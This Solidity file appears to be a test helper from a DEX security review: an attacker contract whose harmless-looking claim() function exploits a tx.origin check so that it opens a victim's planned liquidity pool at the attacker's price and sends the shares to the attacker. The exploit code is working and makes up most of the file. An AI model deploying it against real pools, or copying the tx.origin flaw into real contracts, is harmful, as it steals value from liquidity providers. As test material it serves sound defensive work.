// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Review R328-1, the attacker's side. NOT part of the DEX and never deployed by the package: a test and rehearsal
// helper (test/MultichainFirstDeposit.t.sol; scripts/multichain/rehearse-fork.mjs deploys it on a loopback fork).
//
// The pair accepts a first mint when the TRANSACTION ORIGIN is the factory's first depositor, whoever the sender
// is. This contract stands for anything the depositing account might call: a "claim" page, a token with a
// transfer hook, another site's router. The attacker funds it with dust beforehand; when the depositing account
// calls `claim()`, it opens the owner's planned pool at the attacker's price, inside the owner's own transaction.
interface IOpenerFactory {
    function getPair(address, address) external view returns (address);
    function createPair(address, address) external returns (address);
}

interface IOpenerToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IOpenerWrapped is IOpenerToken {
    function deposit() external payable;
}

interface IOpenerPair {
    function mint(address to) external returns (uint256);
}

contract OriginOpener {
    address public immutable attacker;
    IOpenerFactory public immutable factory;
    IOpenerWrapped public immutable wrapped;
    IOpenerToken public immutable token;

    constructor(address _factory, address _wrapped, address _token) {
        attacker = msg.sender;
        factory = IOpenerFactory(_factory);
        wrapped = IOpenerWrapped(_wrapped);
        token = IOpenerToken(_token);
    }

    receive() external payable {}

    /// What the caller believes: a harmless call. What it does: a first mint of the planned pair with this
    /// contract's own dust (its native coin against its tokens: the attacker's price), shares to the attacker.
    function claim() external {
        address pair = factory.getPair(address(wrapped), address(token));
        if (pair == address(0)) pair = factory.createPair(address(wrapped), address(token));
        uint256 native = address(this).balance;
        wrapped.deposit{value: native}();
        wrapped.transfer(pair, native);
        token.transfer(pair, token.balanceOf(address(this)));
        IOpenerPair(pair).mint(attacker);
    }
}
